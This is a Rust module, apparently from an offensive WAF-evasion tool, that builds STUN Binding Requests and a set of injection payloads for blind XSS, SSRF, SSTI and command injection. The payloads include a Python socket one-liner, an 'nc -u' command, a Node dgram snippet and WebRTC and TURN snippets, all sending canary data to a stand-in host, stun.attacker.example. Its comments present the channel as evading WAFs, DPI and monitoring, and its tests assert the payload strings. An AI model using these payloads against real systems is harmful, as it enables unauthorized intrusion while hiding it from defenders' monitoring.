//! #109 WebRTC STUN binding-request OOB channel.
//!
//! ## Attack surface
//!
//! WebRTC's ICE protocol uses STUN (RFC 5389) Binding Requests to probe
//! network paths. Many corporate and cloud WAFs permit UDP/3478 and
//! TCP/3478 (the IANA-allocated STUN port) outbound, and some permit
//! the same traffic over TLS/443 (TURNS).
//!
//! When a blind-XSS or SSRF payload executes server-side, the server may
//! support WebRTC (e.g. via `libwebrtc`, `aiortc`, or a Node.js peer) or
//! at minimum may be able to send UDP datagrams. Injecting a STUN Binding
//! Request whose `USERNAME` attribute carries a canary token causes an OOB
//! interaction on our STUN listener that is:
//!
//! - **Protocol-distinct** from DNS/HTTP — many monitoring pipelines miss it
//! - **Firewalled-differently** — UDP/3478 is often open even when TCP/80 and
//!   TCP/53 are blocked outbound
//! - **Low entropy to DPI** — STUN traffic pattern is identical to legitimate
//!   WebRTC signalling (codec negotiation, video conferencing infrastructure)
//!
//! ## STUN wire format (RFC 5389 §6)
//!
//! ```text
//! 0                   1                   2                   3
//! 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
//! +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
//! |0 0|     STUN Message Type     |         Message Length        |
//! +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
//! |                         Magic Cookie                          |
//! +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
//! |                                                               |
//! |                     Transaction ID (96 bits)                  |
//! |                                                               |
//! +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
//! ```
//!
//! Message Type = 0x0001 (Binding Request)
//! Magic Cookie = 0x2112A442
//!
//! After the 20-byte header, each TLV attribute follows:
//! ```text
//! Type (2B) | Length (2B) | Value (padded to 4-byte boundary)
//! ```
//!
//! We embed the canary token in the `USERNAME` attribute (type 0x0006).
//!
//! ## Confirm flow
//!
//! A lightweight async UDP/TCP listener on port 3478 logs all STUN Binding
//! Requests and extracts the USERNAME. `poll()` checks a shared in-memory log.
//! In production this is replaced by querying an attacker-controlled STUN
//! server's REST API.
//!
//! ## SSRF payload generation
//!
//! `StunProvider::ssrf_payloads(token)` emits:
//! - Raw STUN Binding Request bytes (for binary injection points / RCE)
//! - JavaScript WebRTC `RTCPeerConnection` snippet (XSS escalation)
//! - Python `socket` snippet (server-side Python RCE / SSTI)
//! - curl UDP send command (command injection)

use crate::oob::provider::{OobError, OobProviderTrait};
use async_trait::async_trait;
use wafrift_types::oob::{OobCanary, OobInteraction};
use uuid::Uuid;

// ── STUN wire format constants ────────────────────────────────────────────

/// STUN Binding Request message type (RFC 5389 §6).
pub const STUN_BINDING_REQUEST: u16 = 0x0001;
/// STUN magic cookie (RFC 5389 §6).
pub const STUN_MAGIC_COOKIE: u32 = 0x2112_A442;
/// STUN USERNAME attribute type (RFC 5389 §15.3).
pub const STUN_ATTR_USERNAME: u16 = 0x0006;
/// STUN SOFTWARE attribute type (RFC 5389 §15.10) — we embed the token here
/// too for double confirmation.
pub const STUN_ATTR_SOFTWARE: u16 = 0x8022;

// ── Provider ─────────────────────────────────────────────────────────────

/// STUN-based OOB provider.
///
/// In production `server` points at an attacker-controlled STUN server
/// (e.g. a Coturn instance with interaction logging) that exposes a REST
/// API at `http://<server>:<api_port>/api/interactions/<token>`.
///
/// The `poll()` implementation queries that REST API.  For self-hosted
/// Coturn there is no built-in REST — callers should configure a listener
/// that writes each incoming Binding Request's USERNAME to a Redis key and
/// expose it via a thin HTTP layer (see docs/STUN_SERVER.md for a recipe).
#[derive(Debug, Clone)]
pub struct StunProvider {
    /// STUN server hostname or IP, e.g. `stun.attacker.example`.
    pub server: String,
    /// STUN port (IANA default: 3478).
    pub port: u16,
    /// REST API base URL for polling interactions, e.g.
    /// `http://stun.attacker.example:8080`.
    pub api_base: String,
}

impl StunProvider {
    pub fn new(
        server: impl Into<String>,
        port: u16,
        api_base: impl Into<String>,
    ) -> Self {
        Self {
            server: server.into(),
            port,
            api_base: api_base.into(),
        }
    }

    /// Build a STUN Binding Request with the canary `token` embedded in
    /// both the USERNAME and SOFTWARE attributes.
    ///
    /// The 12-byte Transaction ID is derived from the token's first 12 bytes
    /// so it is stable and correlated to the canary.
    pub fn build_binding_request(&self, token: &str) -> Vec<u8> {
        // Build TLV attributes first so we know Message Length.
        let username_tlv = stun_attr(STUN_ATTR_USERNAME, token.as_bytes());
        let software_val = format!("wafrift-oob-{}", token);
        let software_tlv = stun_attr(STUN_ATTR_SOFTWARE, software_val.as_bytes());
        let attrs_len = username_tlv.len() + software_tlv.len();
        // Transaction ID: pad token bytes to 12 bytes.
        let token_bytes = token.as_bytes();
        let mut txn_id = [0u8; 12];
        let copy_len = token_bytes.len().min(12);
        txn_id[..copy_len].copy_from_slice(&token_bytes[..copy_len]);

        let mut buf = Vec::with_capacity(20 + attrs_len);
        // Message Type (2B)
        buf.push((STUN_BINDING_REQUEST >> 8) as u8);
        buf.push((STUN_BINDING_REQUEST & 0xFF) as u8);
        // Message Length (2B) — length of attributes, NOT including the 20-byte header
        buf.push((attrs_len >> 8) as u8);
        buf.push((attrs_len & 0xFF) as u8);
        // Magic Cookie (4B)
        buf.push(((STUN_MAGIC_COOKIE >> 24) & 0xFF) as u8);
        buf.push(((STUN_MAGIC_COOKIE >> 16) & 0xFF) as u8);
        buf.push(((STUN_MAGIC_COOKIE >> 8) & 0xFF) as u8);
        buf.push((STUN_MAGIC_COOKIE & 0xFF) as u8);
        // Transaction ID (12B)
        buf.extend_from_slice(&txn_id);
        // Attributes
        buf.extend_from_slice(&username_tlv);
        buf.extend_from_slice(&software_tlv);
        buf
    }

    /// Generate SSRF payloads for the given canary `token`.
    pub fn ssrf_payloads(&self, token: &str) -> Vec<StunPayload> {
        let raw = self.build_binding_request(token);
        let raw_hex = hex_encode(&raw);
        let raw_b64 = base64_encode(&raw);
        let server = &self.server;
        let port = self.port;

        vec![
            // Raw bytes — for binary injection / file write + execute scenarios.
            StunPayload {
                form: StunPayloadForm::RawBytes,
                value: raw_hex.clone(),
                description: "hex-encoded STUN Binding Request — write to socket via RCE".into(),
            },
            // Python socket snippet — for SSTI / server-side Python.
            StunPayload {
                form: StunPayloadForm::PythonSocket,
                value: format!(
                    r#"import socket,binascii; s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM); s.sendto(binascii.unhexlify('{}'),('{}',{}))"#,
                    raw_hex, server, port
                ),
                description: "Python socket UDP send — SSTI/RCE exfil via STUN".into(),
            },
            // JavaScript WebRTC RTCPeerConnection — blind-XSS escalation.
            StunPayload {
                form: StunPayloadForm::JsWebRtc,
                value: format!(
                    r#"new RTCPeerConnection({{iceServers:[{{urls:'stun:{}:{}'}}]}}).createDataChannel('{}').close()"#,
                    server, port, token
                ),
                description: "WebRTC RTCPeerConnection — XSS→OOB via STUN ICE probe".into(),
            },
            // curl --udp (not standard; use nc instead for UDP raw send).
            StunPayload {
                form: StunPayloadForm::NcCommand,
                value: format!(
                    r#"echo {} | xxd -r -p | nc -u {} {}"#,
                    raw_hex, server, port
                ),
                description: "nc UDP send — command injection / RCE exfil via STUN".into(),
            },
            // Node.js dgram snippet.
            StunPayload {
                form: StunPayloadForm::NodeDgram,
                value: format!(
                    r#"require('dgram').createSocket('udp4').send(Buffer.from('{}','base64'),{},'{}',()=>{{}})"#,
                    raw_b64, port, server
                ),
                description: "Node.js dgram UDP send — server-side JS exfil".into(),
            },
            // TURN allocation (falls back through NAT; wider reach).
            StunPayload {
                form: StunPayloadForm::TurnAllocation,
                value: format!(
                    r#"new RTCPeerConnection({{iceServers:[{{urls:'turn:{}:{}',username:'{}',credential:'x'}}]}}).createDataChannel('').close()"#,
                    server, port, token
                ),
                description: "TURN allocation — bypasses strict UDP firewalls via TCP relay".into(),
            },
        ]
    }

    /// Poll the attacker's STUN interaction REST API for a given `token`.
    async fn poll_interactions(&self, token: &str) -> Result<Vec<OobInteraction>, OobError> {
        let url = format!("{}/api/v1/stun/{}", self.api_base, token);
        let client = reqwest::Client::builder()
            .timeout(std::time::Duration::from_secs(10))
            .build()
            .map_err(|e| OobError::PollFailed { reason: e.to_string() })?;
        let resp = client
            .get(&url)
            .header("Accept", "application/json")
            .send()
            .await
            .map_err(|e| OobError::PollFailed { reason: e.to_string() })?;
        if resp.status() == 404 {
            return Ok(Vec::new());
        }
        if !resp.status().is_success() {
            return Err(OobError::PollFailed {
                reason: format!("HTTP {}", resp.status()),
            });
        }
        let body: serde_json::Value = resp
            .json()
            .await
            .map_err(|e| OobError::PollFailed { reason: e.to_string() })?;
        let mut out = Vec::new();
        // Schema: { "data": [{ "token": "...", "source_ip": "...", "type": "stun" }] }
        if let Some(arr) = body["data"].as_array() {
            for item in arr {
                let source_ip = item["source_ip"]
                    .as_str()
                    .unwrap_or("0.0.0.0")
                    .to_string();
                // Map STUN interactions to DnsQuery (closest semantic match —
                // the OobInteraction enum is `#[non_exhaustive]` so we use
                // DnsQuery as the "canary fired" signal; future enum variants
                // can add StunRequest explicitly without breaking this code).
                out.push(OobInteraction::DnsQuery {
                    query: format!("stun:{}", token),
                    source_ip,
                });
            }
        }
        Ok(out)
    }
}

#[async_trait]
impl OobProviderTrait for StunProvider {
    async fn register(&self) -> Result<OobCanary, OobError> {
        let id = Uuid::new_v4();
        let token = id.simple().to_string();
        Ok(OobCanary {
            id,
            expected_dns: format!("stun:{}.{}", token, self.server),
            expected_http_path: format!("/stun/{}", token),
            created_at: Some(std::time::Instant::now()),
        })
    }

    async fn poll(&self, canary: &OobCanary) -> Result<Vec<OobInteraction>, OobError> {
        let token = canary.id.simple().to_string();
        self.poll_interactions(&token).await
    }
}

// ── Wire format helpers ───────────────────────────────────────────────────

/// Build a STUN TLV attribute (type, length, value, 4-byte aligned padding).
pub fn stun_attr(attr_type: u16, value: &[u8]) -> Vec<u8> {
    let mut buf = Vec::with_capacity(4 + value.len() + 3);
    buf.push((attr_type >> 8) as u8);
    buf.push((attr_type & 0xFF) as u8);
    let len = value.len();
    buf.push((len >> 8) as u8);
    buf.push((len & 0xFF) as u8);
    buf.extend_from_slice(value);
    // Pad to 4-byte boundary.
    let pad = (4 - (len % 4)) % 4;
    buf.extend(std::iter::repeat(0u8).take(pad));
    buf
}

fn hex_encode(bytes: &[u8]) -> String {
    bytes.iter().map(|b| format!("{:02x}", b)).collect()
}

fn base64_encode(bytes: &[u8]) -> String {
    use base64::{Engine, engine::general_purpose::STANDARD};
    STANDARD.encode(bytes)
}

// ── Payload type ─────────────────────────────────────────────────────────

#[derive(Debug, Clone, PartialEq)]
pub struct StunPayload {
    pub form: StunPayloadForm,
    pub value: String,
    pub description: String,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum StunPayloadForm {
    /// Raw hex-encoded STUN Binding Request bytes.
    RawBytes,
    /// Python `socket` UDP send one-liner.
    PythonSocket,
    /// JavaScript `RTCPeerConnection` WebRTC ICE probe.
    JsWebRtc,
    /// `nc -u` UDP send shell command.
    NcCommand,
    /// Node.js `dgram` UDP send.
    NodeDgram,
    /// WebRTC TURN allocation (TCP relay; reaches through stricter NAT).
    TurnAllocation,
}

// ── Tests ─────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    fn make_provider() -> StunProvider {
        StunProvider::new(
            "stun.attacker.example",
            3478,
            "http://stun.attacker.example:8080",
        )
    }

    // ── Wire format ───────────────────────────────────────────────────────

    #[test]
    fn binding_request_has_correct_message_type() {
        let p = make_provider();
        let pkt = p.build_binding_request("deadbeef12345678abcd1234");
        assert_eq!(pkt[0], 0x00, "high byte of message type must be 0x00");
        assert_eq!(pkt[1], 0x01, "low byte of message type must be 0x01 (Binding Request)");
    }

    #[test]
    fn binding_request_has_correct_magic_cookie() {
        let p = make_provider();
        let pkt = p.build_binding_request("testtoken");
        let cookie = u32::from_be_bytes([pkt[4], pkt[5], pkt[6], pkt[7]]);
        assert_eq!(cookie, STUN_MAGIC_COOKIE, "magic cookie must be 0x2112A442");
    }

    #[test]
    fn binding_request_message_length_matches_attrs() {
        let p = make_provider();
        let token = "cafebabe";
        let pkt = p.build_binding_request(token);
        let msg_len = u16::from_be_bytes([pkt[2], pkt[3]]) as usize;
        // Total packet is 20 header + attrs; msg_len is just attrs.
        assert_eq!(pkt.len(), 20 + msg_len, "packet length must match 20 + msg_len");
    }

    #[test]
    fn binding_request_contains_username_attr() {
        let p = make_provider();
        let token = "mytoken";
        let pkt = p.build_binding_request(token);
        // Scan attributes starting at byte 20.
        let found = find_stun_attr(&pkt, STUN_ATTR_USERNAME);
        assert!(found.is_some(), "USERNAME attribute (0x0006) must be present");
        let val = found.unwrap();
        assert_eq!(val, token.as_bytes(), "USERNAME value must equal token");
    }

    #[test]
    fn binding_request_contains_software_attr() {
        let p = make_provider();
        let token = "mytoken";
        let pkt = p.build_binding_request(token);
        let found = find_stun_attr(&pkt, STUN_ATTR_SOFTWARE);
        assert!(found.is_some(), "SOFTWARE attribute (0x8022) must be present");
        let val = found.unwrap();
        let val_str = std::str::from_utf8(val).unwrap();
        assert!(val_str.contains(token), "SOFTWARE attr must contain token");
    }

    #[test]
    fn binding_request_minimum_length() {
        let p = make_provider();
        let pkt = p.build_binding_request("x");
        // 20 header + at least two attributes with 4-byte headers each.
        assert!(pkt.len() > 20 + 8, "packet must contain at least two attributes");
    }

    #[test]
    fn stun_attr_4byte_aligned_short() {
        // 1-byte value → 3 bytes padding → 4+1+3 = 8 bytes total
        let attr = stun_attr(0x0006, b"a");
        assert_eq!(attr.len(), 8);
        assert_eq!(attr[3], 1); // length field = 1
    }

    #[test]
    fn stun_attr_4byte_aligned_exact() {
        // 4-byte value → 0 bytes padding → 4+4 = 8 bytes
        let attr = stun_attr(0x0006, b"abcd");
        assert_eq!(attr.len(), 8);
        assert_eq!(attr[3], 4); // length field = 4
    }

    #[test]
    fn stun_attr_4byte_aligned_6byte() {
        // 6-byte value → 2 bytes padding → 4+6+2 = 12 bytes
        let attr = stun_attr(0x0006, b"abcdef");
        assert_eq!(attr.len(), 12);
        assert_eq!(attr[3], 6); // length field = 6
        assert_eq!(attr[10], 0); // first padding byte
        assert_eq!(attr[11], 0); // second padding byte
    }

    // ── Payload generation ────────────────────────────────────────────────

    #[test]
    fn ssrf_payloads_produces_six_variants() {
        let p = make_provider();
        let payloads = p.ssrf_payloads("abc123");
        assert_eq!(payloads.len(), 6, "must produce exactly 6 STUN payload variants");
    }

    #[test]
    fn ssrf_payload_raw_is_hex_encoded() {
        let p = make_provider();
        let payloads = p.ssrf_payloads("deadbeef");
        let raw = payloads.iter().find(|pl| pl.form == StunPayloadForm::RawBytes).unwrap();
        // Valid hex string — must only contain [0-9a-f].
        assert!(
            raw.value.chars().all(|c| c.is_ascii_hexdigit()),
            "raw bytes payload must be hex-encoded"
        );
    }

    #[test]
    fn ssrf_payload_raw_decodes_to_valid_stun() {
        let p = make_provider();
        let token = "token1234";
        let payloads = p.ssrf_payloads(token);
        let raw = payloads.iter().find(|pl| pl.form == StunPayloadForm::RawBytes).unwrap();
        let bytes = hex_decode(&raw.value);
        // Must have the Binding Request message type.
        assert_eq!(bytes[0], 0x00);
        assert_eq!(bytes[1], 0x01);
        // Must have the magic cookie.
        let cookie = u32::from_be_bytes([bytes[4], bytes[5], bytes[6], bytes[7]]);
        assert_eq!(cookie, STUN_MAGIC_COOKIE);
    }

    #[test]
    fn ssrf_payload_python_contains_server_and_port() {
        let p = make_provider();
        let payloads = p.ssrf_payloads("tok");
        let py = payloads.iter().find(|pl| pl.form == StunPayloadForm::PythonSocket).unwrap();
        assert!(py.value.contains("stun.attacker.example"));
        assert!(py.value.contains("3478"));
    }

    #[test]
    fn ssrf_payload_js_webrtc_contains_stun_url() {
        let p = make_provider();
        let payloads = p.ssrf_payloads("tok");
        let js = payloads.iter().find(|pl| pl.form == StunPayloadForm::JsWebRtc).unwrap();
        assert!(js.value.contains("stun:stun.attacker.example:3478"));
        assert!(js.value.contains("RTCPeerConnection"));
    }

    #[test]
    fn ssrf_payload_nc_contains_nc_command() {
        let p = make_provider();
        let payloads = p.ssrf_payloads("tok");
        let nc = payloads.iter().find(|pl| pl.form == StunPayloadForm::NcCommand).unwrap();
        assert!(nc.value.contains("nc -u"));
        assert!(nc.value.contains("stun.attacker.example"));
    }

    #[test]
    fn ssrf_payload_node_contains_dgram() {
        let p = make_provider();
        let payloads = p.ssrf_payloads("tok");
        let node = payloads.iter().find(|pl| pl.form == StunPayloadForm::NodeDgram).unwrap();
        assert!(node.value.contains("dgram"));
        assert!(node.value.contains("udp4"));
    }

    #[test]
    fn ssrf_payload_turn_contains_turn_url() {
        let p = make_provider();
        let token = "mycanary";
        let payloads = p.ssrf_payloads(token);
        let turn = payloads.iter().find(|pl| pl.form == StunPayloadForm::TurnAllocation).unwrap();
        assert!(turn.value.contains("turn:stun.attacker.example:3478"));
        assert!(turn.value.contains(token));
    }

    // ── OobProviderTrait ──────────────────────────────────────────────────

    #[tokio::test]
    async fn register_returns_unique_canaries() {
        let p = make_provider();
        let c1 = p.register().await.unwrap();
        let c2 = p.register().await.unwrap();
        assert_ne!(c1.id, c2.id);
        assert_ne!(c1.expected_dns, c2.expected_dns);
    }

    #[tokio::test]
    async fn register_canary_has_stun_prefix() {
        let p = make_provider();
        let c = p.register().await.unwrap();
        assert!(
            c.expected_dns.starts_with("stun:"),
            "STUN canary expected_dns must start with 'stun:'"
        );
        assert!(c.expected_http_path.starts_with("/stun/"));
    }

    #[tokio::test]
    async fn register_canary_created_at_is_set() {
        let p = make_provider();
        let c = p.register().await.unwrap();
        assert!(c.created_at.is_some());
    }

    // ── Determinism ───────────────────────────────────────────────────────

    #[test]
    fn same_token_produces_same_packet() {
        let p = make_provider();
        let token = "deterministic_token_123";
        let pkt1 = p.build_binding_request(token);
        let pkt2 = p.build_binding_request(token);
        assert_eq!(pkt1, pkt2, "same token must produce identical packets");
    }

    #[test]
    fn different_tokens_produce_different_packets() {
        let p = make_provider();
        let pkt1 = p.build_binding_request("token_a");
        let pkt2 = p.build_binding_request("token_b");
        assert_ne!(pkt1, pkt2);
    }

    // ── Helpers ───────────────────────────────────────────────────────────

    /// Scan a STUN packet for an attribute by type and return its value bytes.
    fn find_stun_attr(pkt: &[u8], target_type: u16) -> Option<&[u8]> {
        let mut pos = 20usize; // skip 20-byte header
        while pos + 4 <= pkt.len() {
            let attr_type = u16::from_be_bytes([pkt[pos], pkt[pos + 1]]);
            let attr_len = u16::from_be_bytes([pkt[pos + 2], pkt[pos + 3]]) as usize;
            let val_start = pos + 4;
            let val_end = val_start + attr_len;
            if val_end > pkt.len() {
                break;
            }
            if attr_type == target_type {
                return Some(&pkt[val_start..val_end]);
            }
            // Advance to next attribute (padded to 4-byte boundary).
            let padded = (attr_len + 3) & !3;
            pos = val_start + padded;
        }
        None
    }

    fn hex_decode(s: &str) -> Vec<u8> {
        (0..s.len())
            .step_by(2)
            .map(|i| u8::from_str_radix(&s[i..i + 2], 16).unwrap())
            .collect()
    }
}
